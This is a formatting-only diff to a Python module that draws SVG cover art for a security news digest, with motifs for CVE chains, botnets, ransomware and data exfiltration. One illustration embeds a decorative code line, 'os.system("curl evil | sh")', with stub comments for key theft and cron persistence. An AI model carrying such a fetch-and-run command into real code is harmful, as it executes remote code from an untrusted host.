@@ -22,6 +22,7 @@ The visual builders (``vb_*``, 11 keys in ``VISUAL_BUILDERS``) each return a
 ``<g transform="translate(cx,cy)">`` SVG string and are theme-aware via the
 THEMES palette.
 """
+
 from __future__ import annotations
 
 import re
@@ -109,7 +110,7 @@ _WCAG_AA = 4.5
 def _rel_luminance(hex_color: str) -> float:
     """WCAG relative luminance of an ``#rrggbb`` color."""
     h = hex_color.lstrip("#")
-    r, g, b = (int(h[i:i + 2], 16) for i in (0, 2, 4))
+    r, g, b = (int(h[i : i + 2], 16) for i in (0, 2, 4))
 
     def _lin(c: float) -> float:
         c /= 255.0
@@ -192,8 +193,7 @@ def _escape(text: str) -> str:
         return ""
     text = _strip_hangul(str(text))
     return (
-        text
-        .replace("&", "&amp;")
+        text.replace("&", "&amp;")
         .replace("<", "&lt;")
         .replace(">", "&gt;")
         .replace('"', "&quot;")
@@ -230,7 +230,7 @@ def _title_cadence(post_title: str) -> str:
     is weekly by default, so an unmarked digest reads as Weekly rather than
     leaking an empty cadence.
     """
-    t = (post_title or "")
+    t = post_title or ""
     low = t.lower()
     if "일간" in t or "일일" in t or "daily" in low:
         return "Daily"
@@ -362,13 +362,13 @@ def vb_cve_chain(cx: int, cy: int, theme: str = "red") -> str:
         f'<rect x="0" y="6" width="14" height="11" rx="1.5" fill="{a}" opacity="0.9"/>'
         f'<path d="M2 6 L2 3 A5 5 0 0 1 12 3 L12 6" stroke="{soft}" stroke-width="1.4" fill="none"/>'
         f'<circle cx="7" cy="11" r="1.2" fill="#0A0C16"/>'
-        f'</g>'
+        f"</g>"
         # Top-right 0-DAY warning badge
         f'<g transform="translate(110,-104)">'
         f'<rect x="0" y="0" width="48" height="16" rx="2.5" fill="#7A0000" stroke="{a}" stroke-width="1.2">'
         f'<animate attributeName="opacity" values="0.7;1;0.7" dur="1.4s" repeatCount="indefinite"/></rect>'
         f'<text x="24" y="11" text-anchor="middle" font-family="Inter, monospace" font-size="9" font-weight="900" fill="#FFE4E6">0-DAY</text>'
-        f'</g>'
+        f"</g>"
         f'<text x="0" y="-86" text-anchor="middle" font-family="Inter, Helvetica, Arial, sans-serif" font-size="11" font-weight="700" fill="{soft}" letter-spacing="2">CVE REGRESSION CHAIN</text>'
         f'<g transform="translate(-140,-70)">'
         f'<rect x="0" y="0" width="280" height="50" rx="6" fill="#1E0A14" stroke="{soft}" stroke-width="1.2"/>'
@@ -378,15 +378,15 @@ def vb_cve_chain(cx: int, cy: int, theme: str = "red") -> str:
         f'<rect x="226" y="6" width="48" height="14" rx="3" fill="#7A0000" stroke="{a}" stroke-width="1">'
         f'<animate attributeName="opacity" values="0.7;1;0.7" dur="1.6s" repeatCount="indefinite"/></rect>'
         f'<text x="250" y="16" text-anchor="middle" font-family="Inter, monospace" font-size="8" font-weight="900" fill="#FFE4E6">PATCHED</text>'
-        f'</g>'
+        f"</g>"
         f'<g transform="translate(-12,-12)">'
         f'<path d="M0 0 L0 22 L-6 14 M0 22 L6 14" stroke="{a}" stroke-width="1.8" fill="none" stroke-linecap="round"/>'
         f'<text x="14" y="14" font-family="Inter, monospace" font-size="9" font-weight="700" fill="{soft}">REGRESSED</text>'
         # Broken-link icon next to REGRESSED arrow
         f'<g transform="translate(-30,8)" stroke="{a}" stroke-width="1.2" fill="none">'
         f'<path d="M0 4 L4 0 L8 4 M2 6 L6 2"><animate attributeName="stroke-opacity" values="0.4;1;0.4" dur="1.6s" repeatCount="indefinite"/></path>'
-        f'</g>'
-        f'</g>'
+        f"</g>"
+        f"</g>"
         f'<g transform="translate(-140,16)">'
         f'<rect x="0" y="0" width="280" height="50" rx="6" fill="#2A0808" stroke="{a}" stroke-width="2">'
         f'<animate attributeName="stroke-opacity" values="0.6;1;0.6" dur="1.8s" repeatCount="indefinite"/></rect>'
@@ -396,16 +396,18 @@ def vb_cve_chain(cx: int, cy: int, theme: str = "red") -> str:
         f'<rect x="232" y="6" width="42" height="14" rx="3" fill="{a}">'
         f'<animate attributeName="opacity" values="0.8;1;0.8" dur="1.2s" repeatCount="indefinite"/></rect>'
         f'<text x="253" y="16" text-anchor="middle" font-family="Inter, monospace" font-size="8" font-weight="900" fill="#FFFFFF">ACTIVE</text>'
-        f'</g>'
+        f"</g>"
         f'<g transform="translate(-140,80)">'
         f'<rect x="0" y="0" width="280" height="22" rx="4" fill="#0E1220" stroke="#3A86FF" stroke-width="1"/>'
         f'<text x="140" y="15" text-anchor="middle" font-family="Inter, monospace" font-size="9" font-weight="700" fill="#8FB8FF">PATCH UPSTREAM NOW</text>'
-        f'</g>'
-        f'</g>'
+        f"</g>"
+        f"</g>"
     )
 
 
-def vb_hub_spoke(cx: int, cy: int, theme: str = "blue", center_label: str = "C2") -> str:
+def vb_hub_spoke(
+    cx: int, cy: int, theme: str = "blue", center_label: str = "C2"
+) -> str:
     """Hub-spoke C2 / botnet: center node with 6 spokes."""
     t = _theme(theme)
     a, soft = t["accent"], t["accent_soft"]
@@ -420,7 +422,7 @@ def vb_hub_spoke(cx: int, cy: int, theme: str = "blue", center_label: str = "C2"
         f'<line x1="0" y1="0" x2="90" y2="-55"/><line x1="0" y1="0" x2="108" y2="0"/>'
         f'<line x1="0" y1="0" x2="90" y2="55"/><line x1="0" y1="0" x2="-90" y2="55"/>'
         f'<line x1="0" y1="0" x2="-108" y2="0"/><line x1="0" y1="0" x2="-90" y2="-55"/>'
-        f'</g>'
+        f"</g>"
         f'<g font-family="Inter, monospace" font-size="7" font-weight="800">'
         # EDGE-1 (router icon)
         f'<g transform="translate(92,-58)"><rect x="-24" y="-12" width="48" height="24" rx="4" fill="#0A2040" stroke="{a}" stroke-width="1.2"/>'
@@ -448,7 +450,7 @@ def vb_hub_spoke(cx: int, cy: int, theme: str = "blue", center_label: str = "C2"
         f'<g transform="translate(-92,-58)"><rect x="-24" y="-12" width="48" height="24" rx="4" fill="#0A2040" stroke="#4ADE80" stroke-width="1.2"/>'
         f'<g transform="translate(-19,-4)" stroke="#4ADE80" stroke-width="0.9" fill="none"><circle cx="2" cy="3" r="1.6"/><path d="M3.5 3 L9 3 M7 3 L7 5"/></g>'
         f'<text x="4" y="2" text-anchor="middle" fill="#4ADE80">CREDS</text></g>'
-        f'</g>'
+        f"</g>"
         f'<g fill="{soft}">'
         f'<circle r="2.2"><animateMotion path="M0 0 L90 -55" dur="2s" repeatCount="indefinite"/></circle>'
         f'<circle r="2.2"><animateMotion path="M0 0 L108 0" dur="1.8s" begin="0.3s" repeatCount="indefinite"/></circle>'
@@ -456,8 +458,8 @@ def vb_hub_spoke(cx: int, cy: int, theme: str = "blue", center_label: str = "C2"
         f'<circle r="2.2"><animateMotion path="M0 0 L-90 55" dur="2.4s" begin="0.9s" repeatCount="indefinite"/></circle>'
         f'<circle r="2.2"><animateMotion path="M0 0 L-108 0" dur="1.9s" begin="1.2s" repeatCount="indefinite"/></circle>'
         f'<circle r="2.2"><animateMotion path="M0 0 L-90 -55" dur="2.1s" begin="1.5s" repeatCount="indefinite"/></circle>'
-        f'</g>'
-        f'</g>'
+        f"</g>"
+        f"</g>"
     )
 
 
@@ -476,22 +478,22 @@ def vb_container_escape(cx: int, cy: int, theme: str = "red") -> str:
         f'<text x="81" y="62" text-anchor="middle">APP LAYER</text>'
         f'<text x="81" y="37" text-anchor="middle">RUNTIME</text>'
         f'<text x="81" y="13" text-anchor="middle">CONTAINER</text>'
-        f'</g>'
+        f"</g>"
         f'<text x="0" y="-22" text-anchor="middle" font-family="Inter, monospace" font-size="10" font-weight="700" fill="#2CCCE4">container API</text>'
-        f'</g>'
+        f"</g>"
         f'<g transform="translate(-65,-126)" filter="url(#softShadow)">'
         f'<rect x="0" y="0" width="130" height="16" rx="3" fill="{a}">'
         f'<animate attributeName="opacity" values="0.85;1;0.85" dur="1.5s" repeatCount="indefinite"/></rect>'
         f'<text x="65" y="11" text-anchor="middle" font-family="Inter, monospace" font-size="9" font-weight="900" fill="#FFFFFF">BYPASS AUTHZ</text>'
-        f'</g>'
+        f"</g>"
         f'<g transform="translate(0,-4)">'
         f'<path d="M0 0 L0 44" stroke="{a}" stroke-width="2.4" stroke-dasharray="4 3" fill="none">'
         f'<animate attributeName="stroke-dashoffset" values="0;-14" dur="1.2s" repeatCount="indefinite"/></path>'
         f'<g fill="{soft}">'
         f'<circle r="3.2"><animateMotion path="M0 -4 L0 46" dur="2.2s" repeatCount="indefinite"/></circle>'
         f'<circle r="2.4" opacity="0.7"><animateMotion path="M0 -4 L0 46" dur="2.2s" begin="0.7s" repeatCount="indefinite"/></circle>'
-        f'</g>'
-        f'</g>'
+        f"</g>"
+        f"</g>"
         f'<circle cx="0" cy="40" r="22" fill="{a}" opacity="0.35">'
         f'<animate attributeName="r" values="16;28;16" dur="2s" repeatCount="indefinite"/>'
         f'<animate attributeName="opacity" values="0.6;0.2;0.6" dur="2s" repeatCount="indefinite"/></circle>'
@@ -502,7 +504,7 @@ def vb_container_escape(cx: int, cy: int, theme: str = "red") -> str:
         f'<circle cx="-22" cy="50" r="1"><animate attributeName="opacity" values="0;1;0" dur="1.8s" begin="0.4s" repeatCount="indefinite"/></circle>'
         f'<circle cx="26" cy="52" r="1.1"><animate attributeName="opacity" values="0;1;0" dur="1.5s" begin="0.7s" repeatCount="indefinite"/></circle>'
         f'<circle cx="0" cy="22" r="0.9"><animate attributeName="opacity" values="0;1;0" dur="1.3s" begin="0.5s" repeatCount="indefinite"/></circle>'
-        f'</g>'
+        f"</g>"
         f'<g transform="translate(-95,50)" filter="url(#softShadow)">'
         f'<rect x="0" y="0" width="190" height="80" rx="10" fill="#1E0A0A" stroke="{a}" stroke-width="2.2"/>'
         f'<path d="M62 0 L74 18 L86 0" stroke="{a}" stroke-width="2" fill="none" stroke-linecap="round">'
@@ -512,9 +514,9 @@ def vb_container_escape(cx: int, cy: int, theme: str = "red") -> str:
         f'<g transform="translate(56,58)" font-family="Inter, monospace" font-size="9" font-weight="900" fill="#FFF5F5">'
         f'<rect x="0" y="0" width="78" height="18" rx="3" fill="#7A0000" stroke="{a}" stroke-width="1.2"/>'
         f'<text x="39" y="13" text-anchor="middle">uid=0  PWNED</text>'
-        f'</g>'
-        f'</g>'
-        f'</g>'
+        f"</g>"
+        f"</g>"
+        f"</g>"
     )
 
 
@@ -541,7 +543,7 @@ def vb_ai_agent_funnel(cx: int, cy: int, theme: str = "amber") -> str:
         f'<line x1="-50" y1="0" x2="0" y2="10" stroke="{a}" stroke-width="0.8" stroke-dasharray="2 2" opacity="0.6"/>'
         f'<line x1="-50" y1="0" x2="0" y2="36" stroke="{a}" stroke-width="0.8" stroke-dasharray="2 2" opacity="0.5"/>'
         f'<line x1="-50" y1="0" x2="0" y2="62" stroke="{a}" stroke-width="0.8" stroke-dasharray="2 2" opacity="0.4"/>'
-        f'</g>'
+        f"</g>"
         f'<g transform="translate(60,-40)" filter="url(#softShadow)">'
         f'<rect x="0" y="0" width="140" height="90" rx="6" fill="#0A0C16" stroke="#E63946" stroke-width="1.4"/>'
         f'<text x="70" y="18" text-anchor="middle" font-family="Inter, monospace" font-size="9" font-weight="800" fill="#F87171">EXPOSED FLEET</text>'
@@ -557,10 +559,10 @@ def vb_ai_agent_funnel(cx: int, cy: int, theme: str = "amber") -> str:
         f'<animate attributeName="opacity" values="0.1;0.5;0.1" dur="1.8s" begin="0.3s" repeatCount="indefinite"/></rect>'
         f'<rect x="108" y="0" width="14" height="10" rx="2" opacity="0.2">'
         f'<animate attributeName="opacity" values="0.1;0.4;0.1" dur="2s" begin="0.5s" repeatCount="indefinite"/></rect>'
-        f'</g>'
+        f"</g>"
         f'<text x="70" y="74" text-anchor="middle" font-family="Inter, monospace" font-size="8" font-weight="700" fill="{a}">automated abuse vector</text>'
-        f'</g>'
-        f'</g>'
+        f"</g>"
+        f"</g>"
     )
 
 
@@ -576,7 +578,7 @@ def vb_ransomware_lock(cx: int, cy: int, theme: str = "red") -> str:
         f'<circle cx="40" cy="60" r="6" fill="#FFFFFF"/>'
         f'<rect x="38" y="62" width="4" height="14" fill="#FFFFFF"/>'
         f'<text x="40" y="116" text-anchor="middle" font-family="Inter, monospace" font-size="10" font-weight="900" fill="{soft}">LOCKED</text>'
-        f'</g>'
+        f"</g>"
         f'<g transform="translate(20,-90)" filter="url(#softShadow)">'
         f'<rect x="0" y="0" width="180" height="180" rx="8" fill="#0A0C16" stroke="{a}" stroke-width="1.4"/>'
         f'<text x="90" y="22" text-anchor="middle" font-family="Inter, monospace" font-size="11" font-weight="900" fill="#F87171">RANSOM NOTE</text>'
@@ -586,16 +588,16 @@ def vb_ransomware_lock(cx: int, cy: int, theme: str = "red") -> str:
         f'<text x="14" y="68">AES-256 + RSA-4096</text>'
         f'<text x="14" y="86">Backups deleted</text>'
         f'<text x="14" y="104">Volume shadow wiped</text>'
-        f'</g>'
+        f"</g>"
         f'<rect x="14" y="118" width="152" height="22" rx="3" fill="#2A0808" stroke="{a}" stroke-width="1.2">'
         f'<animate attributeName="stroke-opacity" values="0.6;1;0.6" dur="1.6s" repeatCount="indefinite"/></rect>'
         f'<text x="90" y="133" text-anchor="middle" font-family="Inter, monospace" font-size="10" font-weight="900" fill="#FFFFFF">PAY OR LOSE DATA</text>'
         f'<g transform="translate(14,148)" font-family="Inter, monospace" font-size="8" font-weight="700" fill="#FFB703">'
         f'<rect x="0" y="0" width="152" height="20" rx="3" fill="#1A1208" stroke="#FFB703" stroke-width="1"/>'
         f'<text x="76" y="14" text-anchor="middle">countdown  /  72h window</text>'
-        f'</g>'
-        f'</g>'
-        f'</g>'
+        f"</g>"
+        f"</g>"
+        f"</g>"
     )
 
 
@@ -610,37 +612,37 @@ def vb_supply_chain_pipe(cx: int, cy: int, theme: str = "amber") -> str:
         f'<text x="40" y="22" text-anchor="middle" font-size="10" fill="#8FB8FF">SOURCE</text>'
         f'<text x="40" y="40" text-anchor="middle" font-size="8" font-weight="600" fill="#BFC9D9">git repo</text>'
         f'<text x="40" y="52" text-anchor="middle" font-size="8" font-weight="600" fill="#BFC9D9">commits</text>'
-        f'</g>'
+        f"</g>"
         f'<g transform="translate(-100,-30)">'
         f'<rect x="0" y="0" width="80" height="60" rx="6" fill="#1E1805" stroke="{a}" stroke-width="2">'
         f'<animate attributeName="stroke-opacity" values="0.6;1;0.6" dur="1.8s" repeatCount="indefinite"/></rect>'
         f'<text x="40" y="22" text-anchor="middle" font-size="10" fill="{soft}">CI / BUILD</text>'
         f'<text x="40" y="40" text-anchor="middle" font-size="8" font-weight="600" fill="{a}">poisoned step</text>'
         f'<circle cx="68" cy="12" r="5" fill="#E63946"><animate attributeName="opacity" values="0.4;1;0.4" dur="1.2s" repeatCount="indefinite"/></circle>'
-        f'</g>'
+        f"</g>"
         f'<g transform="translate(0,-30)">'
         f'<rect x="0" y="0" width="80" height="60" rx="6" fill="#0A1B2E" stroke="#2CCCE4" stroke-width="1.4"/>'
         f'<text x="40" y="22" text-anchor="middle" font-size="10" fill="#2CCCE4">REGISTRY</text>'
         f'<text x="40" y="40" text-anchor="middle" font-size="8" font-weight="600" fill="#7ED4E5">images</text>'
         f'<text x="40" y="52" text-anchor="middle" font-size="8" font-weight="600" fill="#7ED4E5">artifacts</text>'
-        f'</g>'
+        f"</g>"
         f'<g transform="translate(100,-30)">'
         f'<rect x="0" y="0" width="80" height="60" rx="6" fill="#062012" stroke="#4ADE80" stroke-width="1.4"/>'
         f'<text x="40" y="22" text-anchor="middle" font-size="10" fill="#4ADE80">DEPLOY</text>'
         f'<text x="40" y="40" text-anchor="middle" font-size="8" font-weight="600" fill="#86EFAC">prod cluster</text>'
         f'<text x="40" y="52" text-anchor="middle" font-size="8" font-weight="600" fill="#86EFAC">tainted</text>'
-        f'</g>'
+        f"</g>"
         f'<g stroke="{a}" stroke-width="2" fill="none" stroke-linecap="round">'
         f'<path d="M-120 0 L-100 0" stroke-dasharray="3 2"><animate attributeName="stroke-dashoffset" values="0;-10" dur="1s" repeatCount="indefinite"/></path>'
         f'<path d="M-20 0 L0 0" stroke-dasharray="3 2"><animate attributeName="stroke-dashoffset" values="0;-10" dur="1s" repeatCount="indefinite"/></path>'
         f'<path d="M80 0 L100 0" stroke-dasharray="3 2"><animate attributeName="stroke-dashoffset" values="0;-10" dur="1s" repeatCount="indefinite"/></path>'
-        f'</g>'
+        f"</g>"
         f'<g fill="{soft}">'
         f'<circle r="2.4"><animateMotion path="M-120 0 L100 0" dur="3.6s" repeatCount="indefinite"/></circle>'
         f'<circle r="2" opacity="0.7"><animateMotion path="M-120 0 L100 0" dur="3.6s" begin="1.2s" repeatCount="indefinite"/></circle>'
-        f'</g>'
+        f"</g>"
         f'<text x="0" y="56" text-anchor="middle" font-family="Inter, Helvetica, Arial, sans-serif" font-size="10" font-weight="700" fill="{a}" letter-spacing="2">SUPPLY-CHAIN POISON</text>'
-        f'</g>'
+        f"</g>"
     )
 
 
@@ -664,17 +666,17 @@ def vb_code_injection(cx: int, cy: int, theme: str = "red") -> str:
         f'<text x="-138" y="32" fill="#7DA3D9">  6  os.system("curl evil | sh")</text>'
         f'<text x="-138" y="48" fill="#7DA3D9">  7  # exfil_keys()</text>'
         f'<text x="-138" y="64" fill="#7DA3D9">  8  # persist_cron()</text>'
-        f'</g>'
+        f"</g>"
         f'<g transform="translate(118,0)">'
         f'<circle cx="0" cy="0" r="14" fill="{a}" opacity="0.7">'
         f'<animate attributeName="r" values="10;16;10" dur="1.4s" repeatCount="indefinite"/></circle>'
         f'<text x="0" y="3" text-anchor="middle" font-family="Inter, monospace" font-size="9" font-weight="900" fill="#FFFFFF">RCE</text>'
-        f'</g>'
+        f"</g>"
         f'<g fill="{soft}">'
         f'<circle r="2"><animateMotion path="M120 0 L150 -40" dur="1.6s" repeatCount="indefinite"/></circle>'
         f'<circle r="2" opacity="0.7"><animateMotion path="M120 0 L150 -40" dur="1.6s" begin="0.5s" repeatCount="indefinite"/></circle>'
-        f'</g>'
-        f'</g>'
+        f"</g>"
+        f"</g>"
     )
 
 
@@ -692,28 +694,28 @@ def vb_data_exfil(cx: int, cy: int, theme: str = "blue") -> str:
         f'<ellipse cx="40" cy="40" rx="40" ry="6" fill="none" stroke="#2CCCE4" stroke-width="0.8" opacity="0.6"/>'
         f'<text x="40" y="84" text-anchor="middle" font-family="Inter, monospace" font-size="10" font-weight="800" fill="#2CCCE4">DB / S3</text>'
         f'<text x="40" y="98" text-anchor="middle" font-family="Inter, monospace" font-size="8" font-weight="600" fill="#7ED4E5">PII  /  secrets</text>'
-        f'</g>'
+        f"</g>"
         f'<g transform="translate(80,-50)" filter="url(#softShadow)">'
         f'<rect x="0" y="0" width="80" height="80" rx="8" fill="#1E0A0A" stroke="{a}" stroke-width="2"/>'
         f'<text x="40" y="22" text-anchor="middle" font-family="Inter, monospace" font-size="10" font-weight="900" fill="{soft}">ATTACKER</text>'
         f'<g transform="translate(20,32)" stroke="{soft}" stroke-width="1.6" fill="none">'
         f'<circle cx="20" cy="10" r="8"/>'
         f'<path d="M6 32 Q20 22 34 32"/>'
-        f'</g>'
+        f"</g>"
         f'<text x="40" y="74" text-anchor="middle" font-family="Inter, monospace" font-size="8" font-weight="700" fill="#FCA5A5">offshore relay</text>'
-        f'</g>'
+        f"</g>"
         f'<g stroke="{a}" stroke-width="1.4" stroke-dasharray="4 3" fill="none">'
         f'<path d="M-80 -10 L80 -10"><animate attributeName="stroke-dashoffset" values="0;-14" dur="1.2s" repeatCount="indefinite"/></path>'
         f'<path d="M-80 0 L80 0"><animate attributeName="stroke-dashoffset" values="0;-14" dur="1.4s" begin="0.2s" repeatCount="indefinite"/></path>'
         f'<path d="M-80 10 L80 10"><animate attributeName="stroke-dashoffset" values="0;-14" dur="1s" begin="0.4s" repeatCount="indefinite"/></path>'
-        f'</g>'
+        f"</g>"
         f'<g fill="{soft}">'
         f'<circle r="2.4"><animateMotion path="M-80 -10 L80 -10" dur="2s" repeatCount="indefinite"/></circle>'
         f'<circle r="2.4"><animateMotion path="M-80 0 L80 0" dur="2.2s" begin="0.4s" repeatCount="indefinite"/></circle>'
         f'<circle r="2.4"><animateMotion path="M-80 10 L80 10" dur="2.4s" begin="0.8s" repeatCount="indefinite"/></circle>'
-        f'</g>'
+        f"</g>"
         f'<text x="0" y="40" text-anchor="middle" font-family="Inter, Helvetica, Arial, sans-serif" font-size="10" font-weight="700" fill="{a}" letter-spacing="2">DATA EXFILTRATION</text>'
-        f'</g>'
+        f"</g>"
     )
 
 
@@ -723,15 +725,40 @@ def vb_data_exfil(cx: int, cy: int, theme: str = "blue") -> str:
 # This is deliberately minimal (nit 3, CONSERVATIVE): mild visual variety so
 # all-neutral covers are not byte-identical — NOT a new visual or motif.
 _NEUTRAL_TOPIC_CLASSES: Dict[str, Tuple[str, str]] = {
-    "release": ("RELEASE", "#4ADE80"),    # green: version / launch / GA
+    "release": ("RELEASE", "#4ADE80"),  # green: version / launch / GA
     "ecosystem": ("ECOSYSTEM", "#3A86FF"),  # blue: community / cncf / velocity
-    "advisory": ("ADVISORY", "#FFB703"),    # amber: guidance / policy / notice
-    "update": ("UPDATE", "#A78BFA"),        # purple: generic digest update
+    "advisory": ("ADVISORY", "#FFB703"),  # amber: guidance / policy / notice
+    "update": ("UPDATE", "#A78BFA"),  # purple: generic digest update
 }
 _NEUTRAL_CLASS_ORDER: Tuple[str, ...] = ("release", "ecosystem", "advisory", "update")
-_NEUTRAL_RELEASE_KW = ("release", "version", "launch", "ga ", "v1", "v2", "rollout", "ship")
-_NEUTRAL_ECOSYSTEM_KW = ("ecosystem", "cncf", "cloud native", "community", "velocity", "adoption", "foundation")
-_NEUTRAL_ADVISORY_KW = ("advisory", "guidance", "policy", "compliance", "notice", "deprecat", "lifecycle")
+_NEUTRAL_RELEASE_KW = (
+    "release",
+    "version",
+    "launch",
+    "ga ",
+    "v1",
+    "v2",
+    "rollout",
+    "ship",
+)
+_NEUTRAL_ECOSYSTEM_KW = (
+    "ecosystem",
+    "cncf",
+    "cloud native",
+    "community",
+    "velocity",
+    "adoption",
+    "foundation",
+)
+_NEUTRAL_ADVISORY_KW = (
+    "advisory",
+    "guidance",
+    "policy",
+    "compliance",
+    "notice",
+    "deprecat",
+    "lifecycle",
+)
 
 
 def _neutral_topic_class(topic: str, band_index: int = 0) -> str:
@@ -826,7 +853,9 @@ def _motif_mesh(a: str, soft: str, hub_sub: str, hub_sub_color: str) -> str:
                 f'<circle cx="{x}" cy="{y}" r="3.4" fill="#0E1426" stroke="{a}" stroke-width="1.1" opacity="{op:.2f}"/>'
             )
     return (
-        f'<g stroke="{a}" stroke-width="0.8" opacity="0.35">' + "".join(links) + "</g>"
+        f'<g stroke="{a}" stroke-width="0.8" opacity="0.35">'
+        + "".join(links)
+        + "</g>"
         + "".join(nodes)
         + f'<line x1="-104" y1="0" x2="-8" y2="2" stroke="{a}" stroke-width="1" stroke-dasharray="3 2" opacity="0.6"/>'
         + f'<g fill="{soft}"><circle r="2"><animateMotion path="M-104 0 L-8 2" dur="2.3s" repeatCount="indefinite"/></circle></g>'
@@ -973,7 +1002,7 @@ def vb_market(cx: int, cy: int, theme: str = "amber") -> str:
         # Chart frame
         f'<g filter="url(#softShadow)">'
         f'<rect x="-160" y="-66" width="290" height="132" rx="8" fill="#0A0F1E" stroke="{a}" stroke-width="1.4"/>'
-        f'</g>'
+        f"</g>"
         f'<text x="-148" y="-46" font-family="Inter, monospace" font-size="10" font-weight="800" fill="{soft}" letter-spacing="1">MARKET</text>'
         f'<text x="118" y="-46" text-anchor="end" font-family="Inter, monospace" font-size="9" font-weight="700" fill="{a}">PRICE</text>'
         # Gridlines
@@ -981,7 +1010,7 @@ def vb_market(cx: int, cy: int, theme: str = "amber") -> str:
         f'<line x1="-148" y1="-24" x2="118" y2="-24"/>'
         f'<line x1="-148" y1="4" x2="118" y2="4"/>'
         f'<line x1="-148" y1="32" x2="118" y2="32"/>'
-        f'</g>'
+        f"</g>"
         # Candlesticks (wick + body), mixed up/down then trending up
         f'<g stroke-width="1">'
         f'<line x1="-128" y1="-6" x2="-128" y2="40" stroke="{down}"/><rect x="-133" y="6" width="10" height="22" fill="{down}"/>'
@@ -993,7 +1022,7 @@ def vb_market(cx: int, cy: int, theme: str = "amber") -> str:
         f'<line x1="16" y1="-24" x2="16" y2="18" stroke="{down}"/><rect x="11" y="-20" width="10" height="18" fill="{down}"/>'
         f'<line x1="40" y1="-40" x2="40" y2="6" stroke="{up}"/><rect x="35" y="-36" width="10" height="26" fill="{up}"/>'
         f'<line x1="64" y1="-48" x2="64" y2="-4" stroke="{up}"/><rect x="59" y="-44" width="10" height="24" fill="{up}"/>'
-        f'</g>'
+        f"</g>"
         # Rising trend line over the candles
         f'<polyline points="-128,18 -104,16 -80,2 -56,8 -32,-2 -8,-14 16,-8 40,-24 64,-34" '
         f'fill="none" stroke="{a}" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" opacity="0.9"/>'
@@ -1001,11 +1030,11 @@ def vb_market(cx: int, cy: int, theme: str = "amber") -> str:
         f'<g transform="translate(64,-34)" stroke="{a}" stroke-width="2" fill="none" stroke-linecap="round">'
         f'<path d="M0 0 L10 -8 M10 -8 L2 -8 M10 -8 L10 0">'
         f'<animate attributeName="stroke-opacity" values="0.5;1;0.5" dur="1.8s" repeatCount="indefinite"/></path>'
-        f'</g>'
+        f"</g>"
         f'<circle cx="64" cy="-34" r="3.4" fill="{soft}"><animate attributeName="r" values="3;5;3" dur="2s" repeatCount="indefinite"/></circle>'
         # Bottom caption (neutral, no alarm)
         f'<text x="-15" y="60" text-anchor="middle" font-family="Inter, Helvetica, Arial, sans-serif" font-size="10" font-weight="700" fill="{a}" letter-spacing="2">TREND OVERVIEW</text>'
-        f'</g>'
+        f"</g>"
     )
 
 
@@ -1149,13 +1178,13 @@ def vb_security_advisory(
         # Outer card frame
         f'<g filter="url(#softShadow)">'
         f'<rect x="-160" y="-104" width="320" height="208" rx="10" fill="#0A0F1E" stroke="{a}" stroke-width="1.4" opacity="0.95"/>'
-        f'</g>'
+        f"</g>"
         # Top label + ADVISORY badge
         f'<text x="-148" y="-82" font-family="Inter, Helvetica, Arial, sans-serif" font-size="11" font-weight="700" fill="{soft}" letter-spacing="2">SECURITY ADVISORY</text>'
         f'<g transform="translate(96,-96)">'
         f'<rect x="0" y="0" width="60" height="18" rx="3" fill="{a}" opacity="0.9"/>'
         f'<text x="30" y="13" text-anchor="middle" font-family="Inter, monospace" font-size="9" font-weight="900" fill="#0A0F1E">ADVISORY</text>'
-        f'</g>'
+        f"</g>"
         # Centered honest emblem with a calm pulse, rotated per-cover by
         # cover_seed (variant 0 = the original shield+check, byte-identical).
         # Emblem stroke/fill/check pinned GREEN (semantic "reviewed/OK") so it
@@ -1164,8 +1193,8 @@ def vb_security_advisory(
         # each side of the green outline so the emblem stays separated from the
         # surrounding card frame (often red, #E63946) at thumbnail scale.
         f'<g transform="translate(-92,-46)">'
-        f'{_advisory_emblem(cover_seed, shield_a, shield_soft)}'
-        f'</g>'
+        f"{_advisory_emblem(cover_seed, shield_a, shield_soft)}"
+        f"</g>"
         # Right column: severity gauge (unfilled track, TBD marker)
         f'<g transform="translate(8,-44)">'
         f'<text x="0" y="0" font-family="Inter, monospace" font-size="10" font-weight="800" fill="{txt}">SEVERITY</text>'
@@ -1174,20 +1203,20 @@ def vb_security_advisory(
         # Three benign segment ticks (LOW / MED / HIGH scale, no value asserted)
         f'<g stroke="{a}" stroke-width="1" opacity="0.4">'
         f'<line x1="47" y1="12" x2="47" y2="26"/><line x1="93" y1="12" x2="93" y2="26"/>'
-        f'</g>'
+        f"</g>"
         # Neutral marker parked at the midpoint — asserts no score on its own.
         f'<g transform="translate(70,19)">'
         f'<circle cx="0" cy="0" r="6.5" fill="{a}">'
         f'<animate attributeName="opacity" values="0.7;1;0.7" dur="2.2s" repeatCount="indefinite"/></circle>'
         f'<circle cx="0" cy="0" r="2.4" fill="#0A0F1E"/>'
-        f'</g>'
+        f"</g>"
         # Real post-reported severity word, or nothing when unassessed (never
         # "TBD" / "unspecified - under review").
-        f'{severity_line}'
-        f'</g>'
+        f"{severity_line}"
+        f"</g>"
         # Bottom caption (benign, no call to patch)
         f'<text x="0" y="92" text-anchor="middle" font-family="Inter, Helvetica, Arial, sans-serif" font-size="10" font-weight="700" fill="{a}" letter-spacing="2">REVIEW ADVISORY DETAILS</text>'
-        f'</g>'
+        f"</g>"
     )
 
 
@@ -1239,7 +1268,13 @@ def _render_visual(
     # ignore them.
     if fn is vb_neutral:
         return vb_neutral(
-            cx, cy, theme=theme, topic=topic, band_index=band_index, cover_seed=cover_seed, scale=scale
+            cx,
+            cy,
+            theme=theme,
+            topic=topic,
+            band_index=band_index,
+            cover_seed=cover_seed,
+            scale=scale,
         )
     # vb_security_advisory takes the real post-reported severity word so the
     # gauge shows "SEVERITY: HIGH" (or omits the line when unassessed).
@@ -1253,12 +1288,12 @@ def _render_visual(
 def _defs() -> str:
     """Reusable gradient/filter/pattern definitions."""
     return (
-        '<defs>'
+        "<defs>"
         '<linearGradient id="bgSpread" x1="0%" y1="0%" x2="100%" y2="100%">'
         '<stop offset="0%" stop-color="#0B1326"/>'
         '<stop offset="55%" stop-color="#0D1530"/>'
         '<stop offset="100%" stop-color="#141034"/>'
-        '</linearGradient>'
+        "</linearGradient>"
         '<linearGradient id="heroPanel" x1="0%" y1="0%" x2="0%" y2="100%">'
         '<stop offset="0%" stop-color="#1A0A08"/><stop offset="100%" stop-color="#110608"/></linearGradient>'
         '<linearGradient id="heroPanelBlue" x1="0%" y1="0%" x2="0%" y2="100%">'
@@ -1296,7 +1331,7 @@ def _defs() -> str:
         '<feOffset dx="1" dy="1.5"/>'
